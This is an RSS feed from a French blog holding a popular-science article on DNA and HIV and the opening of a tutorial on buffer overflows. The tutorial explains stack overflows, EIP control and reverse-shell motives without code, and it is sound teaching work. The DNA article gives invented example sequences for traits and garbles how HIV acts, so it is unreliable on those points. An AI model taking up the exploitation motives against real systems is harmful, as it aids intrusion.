<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>My Cyber Sharing</title>
    <link>https://www.mycybersharing.com/index.xml</link>
    <description>Recent content on My Cyber Sharing</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>fr</language>
    <copyright>Hack42</copyright>
    <lastBuildDate>Wed, 12 Jun 2019 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://www.mycybersharing.com/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Qu&#39;est ce que l&#39;ADN ?</title>
      <link>https://www.mycybersharing.com/biology/what_is_adn/</link>
      <pubDate>Wed, 12 Jun 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.mycybersharing.com/biology/what_is_adn/</guid>
      <description>

&lt;h2 id=&#34;la-molécule-d-adn&#34;&gt;La molécule d&amp;rsquo;ADN&lt;/h2&gt;

&lt;p&gt;Derrière l&amp;rsquo;ADN ce cache un nom un peu barbare : &amp;ldquo;&lt;strong&gt;A&lt;/strong&gt;cide &lt;strong&gt;D&lt;/strong&gt;ésoxyribo&lt;strong&gt;N&lt;/strong&gt;ucléique&amp;rdquo;, qui est la signification de l&amp;rsquo;ADN.
Cette molécule est présente dans tous les êtres vivants (même les plantes) et contient le patrimoine génétique de l&amp;rsquo;espèce. Elle est unique d&amp;rsquo;un individu à un autre et elle est d&amp;rsquo;ailleurs responsable de la diversité génétique des êtres vivants.&lt;/p&gt;

&lt;p&gt;Ce code génétique contient toutes les informations définissant notre apparence : la couleur de nos cheveux, de nos yeux, la forme de notre visage, notre taille&amp;hellip; mais également les informations nécessaires au bon fonctionnement de notre organisme.
Bref, nos caractéristiques sont définies par notre ADN.&lt;/p&gt;

&lt;p&gt;L&amp;rsquo;ADN est une composante de nos cellules : chacune de nos cellules (plus de 30 000 milliards chez l&amp;rsquo;Homme) contiennent des molécules d&amp;rsquo;ADN et sont strictement identiques d&amp;rsquo;une cellule à une autre.&lt;/p&gt;

&lt;p&gt;Si nous devions dérouler notre ADN afin d&amp;rsquo;obtenir une corde, sa taille mesurerait pas loin de 2 mètres de long! Et si nous collions toutes ces cordes (pour chacune des cellules), on pourrait faire des allers-retours terre/lune sans aucun souci.&lt;/p&gt;

&lt;h2 id=&#34;l-apparence-de-l-adn&#34;&gt;L&amp;rsquo;apparence de l&amp;rsquo;ADN&lt;/h2&gt;

&lt;p&gt;L&amp;rsquo;ADN est structuré de deux brins qui s&amp;rsquo;enroulent pour former une hélice. Ces deux brins sont reliés par des &amp;ldquo;bâtonnets&amp;rdquo; et forment ainsi une sorte d&amp;rsquo;échelle. Une cellule humaine mesure quelques micromètres et l&amp;rsquo;ADN fait partie des molécules de la cellule.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/biology/what_is_adn/adn_design.jpg&#34; alt=&#34;ADN&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Une cellule a une taille vraiment petite, à l&amp;rsquo;exception du jaune d&amp;rsquo;oeuf&amp;hellip; En effet, un jaune d&amp;rsquo;oeuf est une et une seule cellule à part entière. Surprenant, non?&lt;/p&gt;

&lt;h2 id=&#34;de-la-cellule-à-l-adn&#34;&gt;De la cellule à l&amp;rsquo;ADN&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Une cellule contient un &lt;strong&gt;génome&lt;/strong&gt;, l&amp;rsquo;intégralité du patrimoine génétique d&amp;rsquo;une espèce vivante. Ce génome est présent au sein du noyau de la cellule.&lt;/li&gt;
&lt;li&gt;Si nous zoomons sur un génome, nous allons apercevoir un ou des &lt;strong&gt;chromosomes&lt;/strong&gt; (en fonction de l&amp;rsquo;espèce). L&amp;rsquo;Homme possède au total 46 chromosomes répartis en 23 paires (les chromosomes sont par deux). Nous avons 22 paires d&amp;rsquo;&lt;a href=&#34;https://fr.wikipedia.org/wiki/Autosome&#34;&gt;autosomes&lt;/a&gt; numérotés de 1 à 22 et la paire 23 sont les chromosomes sexuels, X et Y. La femme possède deux chromosomes X (XX) et l&amp;rsquo;homme possède un chromosome X et un chromosome Y (XY).&lt;/li&gt;
&lt;li&gt;Un chromosome possède une molécule d&amp;rsquo;ADN. Ce brain d&amp;rsquo;ADN est segmenté en plusieurs &lt;strong&gt;gènes&lt;/strong&gt; (~22 000 chez l&amp;rsquo;Homme), permettant de coder des protéines.&lt;/li&gt;
&lt;li&gt;Un gène est un fragment d&amp;rsquo;une molécule d&amp;rsquo;ADN. Un zoom sur un gène nous permettrais d&amp;rsquo;apercevoir la structure de l&amp;rsquo;ADN qui le compose : une &lt;strong&gt;succession de bases azotées&lt;/strong&gt; (bâtonnets colorés sur le schéma).&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Un petit schéma très bien fait va nous permettre d&amp;rsquo;y voir un peu plus clair :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/biology/what_is_adn/genome.png&#34; alt=&#34;Génome&#34; /&gt;
&lt;em&gt;William Crochot&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Vous êtes toujours là j&amp;rsquo;espère? Nous avons encore plein de choses à voir exceptionnellement fascinantes!
Poursuivons notre voyage :)&lt;/p&gt;

&lt;h2 id=&#34;la-composition-de-l-adn&#34;&gt;La composition de l&amp;rsquo;ADN&lt;/h2&gt;

&lt;p&gt;L&amp;rsquo;ADN est composé d&amp;rsquo;une suite d&amp;rsquo;éléments qui sont appelés &lt;strong&gt;nucléotides&lt;/strong&gt; et qui sont emboités comme des legos. Tout à l&amp;rsquo;heure j&amp;rsquo;ai parlé de &lt;strong&gt;base azotée&lt;/strong&gt;&amp;hellip; une base azotée est un composant clé des nucléotides et c&amp;rsquo;est en enchainant des bases azotées qu&amp;rsquo;il est possible de coder une protéine.&lt;/p&gt;

&lt;p&gt;Il existe au totales 4 bases azotées différentes :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;L&amp;rsquo;adénime =&amp;gt; &lt;strong&gt;A&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;La thymine =&amp;gt; &lt;strong&gt;T&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;La Cytosine =&amp;gt; &lt;strong&gt;C&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;La Guanine =&amp;gt; &lt;strong&gt;G&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pour former un &amp;ldquo;bâtonnet&amp;rdquo;, il faut assembler deux nucléotides complémentaires et nous obtenons une &lt;strong&gt;séquence&lt;/strong&gt;. Les &amp;ldquo;bâtonnets&amp;rdquo; dont je vous parle depuis le début sont donc des &lt;strong&gt;séquences&lt;/strong&gt;, un ensemble de deux nucléotides.&lt;/p&gt;

&lt;p&gt;Les bases azotées ne peuvent pas s&amp;rsquo;assembler avec n&amp;rsquo;importe quelle autre base azotée, elles doivent en effet être complémentaires :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;A&lt;/strong&gt; &amp;lt;=&amp;gt; &lt;strong&gt;T&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;C&lt;/strong&gt; &amp;lt;=&amp;gt; &lt;strong&gt;G&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/biology/what_is_adn/adn_zoom.jpg&#34; alt=&#34;Zoom ADN&#34; /&gt;
&lt;strong&gt;&lt;em&gt;Désolé pour la qualité du schéma&amp;hellip;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Nous pouvons constater sur le schéma qu&amp;rsquo;un nucléotide n&amp;rsquo;est pas composé uniquement d&amp;rsquo;une base azotée. En effet, pour que cette base azotée puisse tenir à son brin d&amp;rsquo;ADN, un &lt;strong&gt;sucre&lt;/strong&gt; (ou désoxyribose) ainsi qu&amp;rsquo;un &lt;strong&gt;phosphate&lt;/strong&gt; sont nécessaires.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/biology/what_is_adn/nucleotide.jpg&#34; alt=&#34;Zoom ADN&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Pour résumé, un gène n&amp;rsquo;est rien d&amp;rsquo;autre qu&amp;rsquo;un enchainement de nucléotides permettant de coder une protéine.
Par exemple:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;span style=&#34;color:blue&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:green&#34;&gt;T&lt;/span&gt; &lt;span style=&#34;color:orange&#34;&gt;C&lt;/span&gt;&lt;span style=&#34;color:purple&#34;&gt;G&lt;/span&gt; &lt;span style=&#34;color:green&#34;&gt;T&lt;/span&gt;&lt;span style=&#34;color:blue&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:purple&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:orange&#34;&gt;C&lt;/span&gt;&lt;/strong&gt; =&amp;gt; cheveux blonds (&lt;a href=&#34;https://fr.wikipedia.org/wiki/M%C3%A9lanine&#34;&gt;mélanine&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;C&lt;/span&gt;&lt;span style=&#34;color:purple&#34;&gt;G&lt;/span&gt; &lt;span style=&#34;color:green&#34;&gt;T&lt;/span&gt;&lt;span style=&#34;color:blue&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:blue&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:green&#34;&gt;T&lt;/span&gt; &lt;span style=&#34;color:purple&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:orange&#34;&gt;C&lt;/span&gt;&lt;/strong&gt; =&amp;gt; globule blanc (&lt;a href=&#34;https://fr.wikipedia.org/wiki/Leucocyte&#34;&gt;Leucocyte&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;la-réplication-et-la-mutation-génétique&#34;&gt;La réplication et la mutation génétique&lt;/h2&gt;

&lt;h3 id=&#34;une-réplication-constante&#34;&gt;Une réplication constante&lt;/h3&gt;

&lt;p&gt;Durant la vie d&amp;rsquo;un individu, les cellules sont amenées à être répliquées puis se divisent en deux cellules filles équivalentes. Cette réplication cellulaire est nécessaire à la croissance, la formation de l&amp;rsquo;organisme et également au renouvellement des cellules à la suite d&amp;rsquo;une mort naturelle ou programmée. Chez l&amp;rsquo;Homme, des millions de cellules par seconde sont répliquées.
Cette réplication cellulaire est appelée le &lt;strong&gt;cycle cellulaire&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Durant le processus de réplication, l&amp;rsquo;ADN est copié à l&amp;rsquo;identique afin d&amp;rsquo;obtenir deux cellules strictement identiques.&lt;/p&gt;

&lt;h3 id=&#34;parfois-il-y-a-mutation&#34;&gt;Parfois, il y a mutation&lt;/h3&gt;

&lt;p&gt;Le processus de réplication cellulaire peut entrainer une mutation, c&amp;rsquo;est-à-dire le remplacement, la perte ou l&amp;rsquo;ajout d&amp;rsquo;un nucléotique au sein de l&amp;rsquo;ADN :&lt;/p&gt;

&lt;p&gt;AT &lt;strong&gt;CG&lt;/strong&gt; TA GC =&amp;gt; AT &lt;strong&gt;CC&lt;/strong&gt; TA GC&lt;/p&gt;

&lt;p&gt;Cette mutation génétique peut être produite lors d&amp;rsquo;une erreur de réplication de la cellule ou être provoquée par des &lt;a href=&#34;https://fr.wikipedia.org/wiki/Mutag%C3%A8ne&#34;&gt;agents mutagènes&lt;/a&gt; tels que les rayons X ou la radioactivité.&lt;/p&gt;

&lt;p&gt;La mutation d&amp;rsquo;un gène peut potentiellement être néfaste pour l&amp;rsquo;organisme. En effet, la modification d&amp;rsquo;un gène à la suite d&amp;rsquo;une mutation peut coder une protéine différente, ou même arrêter la production de la protéine. La modification ou l&amp;rsquo;arrêt d&amp;rsquo;une protéine peut faire suite à l&amp;rsquo;apparition d&amp;rsquo;un cancer ou d&amp;rsquo;une maladie rare.&lt;/p&gt;

&lt;p&gt;Il peut arriver qu&amp;rsquo;une mutation n&amp;rsquo;entraine pas la modification de la protéine produite, on va alors parler d&amp;rsquo;une &lt;a href=&#34;https://fr.wikipedia.org/wiki/Mutation_silencieuse&#34;&gt;mutation silencieuse&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Les mutations des gènes sont à l&amp;rsquo;origine de l&amp;rsquo;évolution de l&amp;rsquo;espèce et de la &lt;a href=&#34;https://fr.wikipedia.org/wiki/Biodiversit%C3%A9&#34;&gt;biodiversité&lt;/a&gt;. Si cette mutation génétique est transmise à la génération suivante, elle est dite mutation &lt;a href=&#34;https://fr.wikipedia.org/wiki/H%C3%A9r%C3%A9dit%C3%A9&#34;&gt;héréditaire&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/biology/what_is_adn/evolution.png&#34; alt=&#34;Evolution&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Les gènes de l&amp;rsquo;être humain présentent des différences d&amp;rsquo;une population à une autre. Ces différences sont dues à la suite d&amp;rsquo;une mutation génétique au cours des générations humaines, permettant ainsi d&amp;rsquo;adapter l&amp;rsquo;être humain à son environnement et à devenir plus résistant.&lt;/p&gt;

&lt;p&gt;Face au SIDA, des inégalités dans le monde existe à la suite d&amp;rsquo;une mutation génétique. Une mutation génétique a fait suite à la modification du fonctionnement d&amp;rsquo;un récepteur surnommé &lt;a href=&#34;https://fr.wikipedia.org/wiki/CCR5&#34;&gt;CCR5&lt;/a&gt;. Plusieurs formes du virus VIH utilisent ce récepteur pour pénétrer les cellules humaines et ainsi mettre en péril notre organisme. La modification de ce récepteur permet ainsi de réduire le risque d&amp;rsquo;attraper le VIH ou de le transmettre à une personne.&lt;/p&gt;

&lt;h2 id=&#34;le-virus-du-sida&#34;&gt;Le virus du SIDA&lt;/h2&gt;

&lt;p&gt;Le virus du SIDA (Syndrome d&amp;rsquo;ImmunoDéficience Humaine) est composé de deux brins d&amp;rsquo;ARN avec un peu moins de 10 000 nucléotides (pour 1 brin). Il fait partie de la famille des &lt;a href=&#34;https://fr.wikipedia.org/wiki/Lentivirus&#34;&gt;lentivirus&lt;/a&gt;, c&amp;rsquo;est-à-dire qu&amp;rsquo;il a la capacité de tuer les cellules qu&amp;rsquo;ils infectent.&lt;/p&gt;

&lt;p&gt;Le VIH (Virus de l&amp;rsquo;Immunodéficience Humaine) est le virus qui peut déclencher la maladie nommée SIDA. Une personne atteinte du VIH est dite séropositive, cela ne veut pas forcément dire qu&amp;rsquo;elle est atteinte du SIDA. L&amp;rsquo;infection par le VIH peut rester invisible durant de nombreuses années sans avoir le moindre symptôme. En revanche, dès la contamination, la maladie du VIH est transmissible mais n&amp;rsquo;est pas contagieuse (la différence est importante).&lt;/p&gt;

&lt;p&gt;Le SIDA vient littéralement écrouler le système immunitaire, un système biologique permettant de reconnaître un virus et de mettre en place les défenses nécessaires pour l&amp;rsquo;élimination de ce dernier. Pour ce faire, le virus vient prendre le contrôle du gène responsable de la production de la protéine &lt;a href=&#34;https://fr.wikipedia.org/wiki/CD4&#34;&gt;CD4&lt;/a&gt;. Il endommage le gène et va finir par le détruire, provoquant l&amp;rsquo;arrêt de la production de la protéine.
Le virus entre dans une cellule cible et l&amp;rsquo;infecte en lui injectant son patrimoine génétique.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Primo-infection&lt;/strong&gt; : le virus envahit progressivement l&amp;rsquo;organisme contaminé jusqu&amp;rsquo;à une prise de contrôle globale. Cette colonisation est très rapide et la quantité de protéines CD4 chutes brutalement. Des symptômes peuvent apparaître comme un mal de tête, de la fièvre, une grande fatigue&amp;hellip; Après quelques semaines, le système immunitaire commence à réagir contre le virus en produisant des anticorps et la maladie recule. La quantité de protéines CD4 augmente à nouveau et le système immunitaire reprend le dessus.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;La phase asymptomatique&lt;/strong&gt; : une longue guerre débute entre le virus et le système immunitaire. Le système immunitaire produit des anticorps afin de lutter contre le virus alors que le virus vient détruire les protéines permettant de lutter contre les virus&amp;hellip; malheureusement le virus va prendre peu à peu le dessus en détruisant les productions de CD4.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;La phase SIDA (phase terminale)&lt;/strong&gt; : la quantité de protéines CD4 s&amp;rsquo;effondre et c&amp;rsquo;est l&amp;rsquo;intégralité du système immunitaire qui s&amp;rsquo;écroule. La charge virale devient extrêmement importante, mais ce n&amp;rsquo;est pas ça qui tue : c&amp;rsquo;est l&amp;rsquo;absence du système immunitaire, obligatoire pour survivre. L&amp;rsquo;organisme est fragilisé et extrêmement sensible aux agressions extérieures. A ce stade, une simple grippe peut nous rendre très malade voire tuer.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Avec les derniers traitements, il est tout à fait possible de vivre avec le virus du VIH et rester en bonne santé. Ces traitements sont dits &amp;ldquo;traitements antirétroviraux&amp;rdquo; ou ARV. L&amp;rsquo;objectif de ces traitements est de bloquer le processus de réplication du virus et de limiter ainsi le nombre de cellules infectées. Ils permettent également de renforcer le système immunitaire&lt;/p&gt;

&lt;h2 id=&#34;les-vrais-jumeaux-homozygotes&#34;&gt;Les vrais jumeaux (homozygotes)&lt;/h2&gt;

&lt;p&gt;Comme dit précédemment, l&amp;rsquo;ADN est unique d&amp;rsquo;un individu à un autre. Mais il y a une exception&amp;hellip; Les vrais jumeaux (&lt;a href=&#34;https://fr.wikipedia.org/wiki/Homozygote&#34;&gt;homozygotes&lt;/a&gt;) ont exactement le même profil d&amp;rsquo;ADN. Depuis les années 80, l&amp;rsquo;ADN est utilisé par la police scientifique afin d&amp;rsquo;identifier un criminel mais il n&amp;rsquo;est pas possible de distinguer deux vrais jumeaux par ce moyen.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Sauf que&amp;hellip;&lt;/em&gt;&lt;/strong&gt; il existe une méthode génétique qui permet de différencier deux vrais jumeaux : les mutations &lt;a href=&#34;https://fr.wikipedia.org/wiki/%C3%89pig%C3%A9n%C3%A9tique&#34;&gt;épigénétiques&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;Une mutation dite &amp;ldquo;épigénétique&amp;rdquo; est la modification d&amp;rsquo;une &amp;ldquo;couche&amp;rdquo; d&amp;rsquo;informations complémentaires qui indique comment ces gènes doivent être utilisés par la cellule. Cette modification ne modifie pas les séquences d&amp;rsquo;ADN, aucun nucléotide n&amp;rsquo;est donc affecté par ce changement : elle peut activer ou non un gène. Cette &amp;ldquo;couche&amp;rdquo; d&amp;rsquo;informations peut être transmise lors de la réplication cellulaire. Durant la vie d&amp;rsquo;un individu, des mutations épigénétiques peuvent apparaître en fonction de facteurs environnementaux (la cigarette, l&amp;rsquo;alcool, le sport&amp;hellip;). Cette mutation n&amp;rsquo;est pas transmissible à ses descendants.&lt;/p&gt;

&lt;p&gt;C&amp;rsquo;est en identifiant des mutations épigénétiques qu&amp;rsquo;il est possible de différencier deux vrais jumeaux par prélèvement d&amp;rsquo;ADN. En revanche, cette méthode d&amp;rsquo;identification est très coûteuse, c&amp;rsquo;est pourquoi elle est rarement utilisée mais il faut savoir que c&amp;rsquo;est techniquement possible de différencier des vrais jumeaux.&lt;/p&gt;

&lt;h2 id=&#34;human-genom-project-hgp-une-mission-importante&#34;&gt;Human Genom Project (HGP), une mission importante&lt;/h2&gt;

&lt;p&gt;Le génome humain a une taille d&amp;rsquo;environ 3,2 milliards de paires de nucléotides répartie sur 23 chromosomes&amp;hellip;
Le Projet Génome Humain est une mission mise en place par le consortium international et qui a débuté en 1990 dont l&amp;rsquo;objectif était d&amp;rsquo;identifier le séquençage complet de l&amp;rsquo;ADN du génome humain. Une mission complètement folle qui a duré plus de 13 ans à la suite du travail acharné de plus de 1000 scientifiques répartis dans le monde entier. En avril 2003, le génome humain a été couvert à 99% avec une précision de 99.99%, la mission s&amp;rsquo;est achevée !&lt;/p&gt;

&lt;p&gt;Le résultat de cette mission est totalement public et disponible &lt;a href=&#34;https://www.ncbi.nlm.nih.gov/grc/human&#34;&gt;ici&lt;/a&gt;.
Et vous savez quoi? Vous pouvez même télécharger le fichier contenant le génome humain, un fichier de plus de 3 GigaOctets : &lt;a href=&#34;http://hgdownload.cse.ucsc.edu/goldenPath/hg38/bigZips/hg38.fa.gz&#34;&gt;ici&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/biology/what_is_adn/hg38.png&#34; alt=&#34;Génome humain&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Si vous souhaitez explorer le génome humain, je vous conseille &lt;a href=&#34;http://dridk.me/naviguer-dans-votre-adn.html&#34;&gt;ce ticket&lt;/a&gt; de Sacha Schutz.&lt;/p&gt;

&lt;h3 id=&#34;le-génome-d-une-seule-personne&#34;&gt;Le génome d&amp;rsquo;une seule personne ?&lt;/h3&gt;

&lt;p&gt;Eh non, cela ne serait pas pertinent suite au brassage et aux mutations des gènes durant la vie d&amp;rsquo;un individu. Le génome humain a été séquencé grâce à plusieurs individus qui ont fait le don de leurs ADN de façon totalement anonyme. Par la suite, ces dons ont été dispersés dans plusieurs laboratoires afin de répartir la charge de travail astronomique, le séquençage du génome.&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;L&amp;rsquo;ADN a encore bien des mystères à nous révéler mais la connaissance de l&amp;rsquo;ADN et de son fonctionnement a fortement progressé durant ces dernières années grâce aux progrès technologiques, et notamment avec les &lt;a href=&#34;https://fr.wikipedia.org/wiki/S%C3%A9quenceur_d%27ADN&#34;&gt;séquenceurs d&amp;rsquo;ADN&lt;/a&gt;. La maîtrise de notre patrimoine génétique nous permettrais à l&amp;rsquo;avenir de soigner des maladies génétiques, des cancers ou même le SIDA.&lt;/p&gt;

&lt;p&gt;La maîtrise et la modification de l&amp;rsquo;ADN n&amp;rsquo;ont pas que du positif&amp;hellip; il y a en effet des risques de dérives éthiques. Quand je parle de &amp;ldquo;dérives éthiques&amp;rdquo;, je pense à la manipulation du génome humain (modification). &lt;a href=&#34;https://www.museum.toulouse.fr/-/crispr-cas-une-technique-revolutionnaire-pour-modifier-le-genome&#34;&gt;CRISPR-Cas&lt;/a&gt; (ou &amp;ldquo;ciseaux moléculaires&amp;rdquo;) est une méthode permettant de modifier le génome de façon ciblée, simple, rapide et abordable. C&amp;rsquo;est cette méthode qui a été utilisé pour la &lt;a href=&#34;https://www.sciencesetavenir.fr/sante/ogm-bebes-crispr-une-deuxieme-femme-est-enceinte_130917&#34;&gt;modification génétique d&amp;rsquo;embryons humain&lt;/a&gt; faisant suite à la naissance de deux jumelles&amp;hellip; Nous devons rester vigilant sur ce que pourrait nous apporter la connaissance et la maîtrise du génome humain, qui est à utiliser avec prudence.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>App-Sys: Sur les traces d&#39;un buffer overflow</title>
      <link>https://www.mycybersharing.com/cybersecu/app_sys_buffer_overflow/</link>
      <pubDate>Fri, 22 Mar 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.mycybersharing.com/cybersecu/app_sys_buffer_overflow/</guid>
      <description>

&lt;h2 id=&#34;prérequis&#34;&gt;Prérequis&lt;/h2&gt;

&lt;p&gt;Avant de commencer, il est nécessaire d&amp;rsquo;avoir quelques bases en exploitation applicative système.&lt;br /&gt;
Il faut donc connaître le fonctionnement du processeur, les registres, la structure d&amp;rsquo;un programme et surtout &lt;strong&gt;le fonctionnement de la pile&lt;/strong&gt;.&lt;br /&gt;
Pour cela, si ce n&amp;rsquo;est déjà fait, je vous invite à lire mon article &amp;ldquo;&lt;a href=&#34;https://www.mycybersharing.com/cybersecu/app_sys_start_gradually&#34;&gt;Débuter progressivement&lt;/a&gt;&amp;rdquo;.&lt;/p&gt;

&lt;h2 id=&#34;quel-est-le-principe-d-un-buffer-overflow&#34;&gt;Quel est le principe d&amp;rsquo;un &amp;ldquo;buffer overflow&amp;rdquo; ?&lt;/h2&gt;

&lt;p&gt;Avant de parler de l&amp;rsquo;overflow, nous allons déjà parler du &amp;ldquo;buffer&amp;rdquo;.&lt;br /&gt;
Un &amp;ldquo;buffer&amp;rdquo; en programmation est une mémoire-tampon permettant de stocker temporairement des données (chaîne de caractères, contenu d&amp;rsquo;un fichier&amp;hellip;) avant d&amp;rsquo;être utilisées ou simplement copiées dans une autre zone mémoire. Par exemple, quand vous entrez du texte dans un programme, votre texte est placé temporairement dans un buffer (mémoire-tampon) et ensuite l&amp;rsquo;adresse du buffer peut être envoyée à une fonction d&amp;rsquo;affichage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/buffer.jpg&#34; alt=&#34;buffer&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mais&amp;hellip; c&amp;rsquo;est quoi ce truc à la fin de mon buffer ?&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
&amp;ldquo;\x00&amp;rdquo;, ça ? &lt;strong&gt;le null byte de fin de chaîne&lt;/strong&gt;, et le &amp;ldquo;\x&amp;rdquo; permet d&amp;rsquo;indiquer une valeur he&lt;strong&gt;x&lt;/strong&gt;adécimale. Cet octet nul sert tout simplement à indiquer que c&amp;rsquo;est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s&amp;rsquo;arrêter de lire en mémoire. La fonction d&amp;rsquo;impression l&amp;rsquo;a utilisée pour afficher le texte &amp;ldquo;Julien&amp;rdquo; à l&amp;rsquo;écran. Sans ce caractère nul, la fonction serait incapable de savoir où se situe la fin du texte et elle continuerait à lire la suite.&lt;/p&gt;

&lt;p&gt;Et voilà&amp;hellip;.. Ah oui, j&amp;rsquo;ai failli oublier! L&amp;rsquo;overflow maintenant :)&lt;br /&gt;
&amp;ldquo;Overflow&amp;rdquo; c&amp;rsquo;est le fait de déborder de ce buffer et d&amp;rsquo;aller écrire en dehors de l&amp;rsquo;espace initialement prévu. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l&amp;rsquo;application !&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/overflow.jpg&#34; alt=&#34;overflow&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mais comment c&amp;rsquo;est possible ? Si on a une taille de 10, alors ça se bloque à 10. Non ?&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
Non, pas si le développeur a oublié de prendre en compte la taille du buffer. Il peut très bien demander un buffer de 10 caractères et autoriser à en écrire 20. Et là, on peut écraser 10 valeurs qui n&amp;rsquo;étaient pas réservées à notre buffer&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;pourquoi-exploiter-un-buffer-overflow&#34;&gt;Pourquoi exploiter un &amp;ldquo;buffer overflow&amp;rdquo; ?&lt;/h2&gt;

&lt;p&gt;Pour faire planter l&amp;rsquo;application !! Non, je plaisante ;)&lt;br /&gt;
L&amp;rsquo;objectif c&amp;rsquo;est de dévier le flux d&amp;rsquo;exécution du programme et de pouvoir exécuter du code qui n&amp;rsquo;était pas prévu initialement. Il y a potentiellement pleins d&amp;rsquo;informations utiles après le buffer en question et le fait de pouvoir les réécrires peut amener à contrôler le registre d&amp;rsquo;instruction (vous savez, le fameux registre EIP).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Je ferme l&amp;rsquo;application et j&amp;rsquo;exécute directement les commandes que je veux, pourquoi s&amp;rsquo;embêter ?&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
Parce que vous n&amp;rsquo;avez pas forcément les droits nécessaires :p Sur une machine, il y a des services qui peuvent tourner avec des privilèges élevés ou alors des binaires possédant le flag &amp;ldquo;suid&amp;rdquo; et là prendre le contrôle d&amp;rsquo;une telle application devient nettement plus intéressant.&lt;/p&gt;

&lt;p&gt;Quelques exemples motivant un attaquant à exploiter un buffer overflow :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d&amp;rsquo;exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d&amp;rsquo;obtenir un reverse shell (un shell qui vient se conecter sur la machine de l&amp;rsquo;attaquant).&lt;/li&gt;
&lt;li&gt;Cette fois, l&amp;rsquo;attaquant à la main sur la machine mais possède des privilèges limités. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d&amp;rsquo;obtenir un shell possédant les pleins pouvoirs.&lt;/li&gt;
&lt;li&gt;Maintenant aucun service n&amp;rsquo;est vulnérable et l&amp;rsquo;attaquant n&amp;rsquo;a pas la main sur la machine. Dans un premier temps, il va utiliser de l&amp;rsquo;ingénierie sociale (manipulation de l&amp;rsquo;être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l&amp;rsquo;un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique&amp;hellip;) et l&amp;rsquo;attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).&lt;/li&gt;
&lt;/ul&gt;

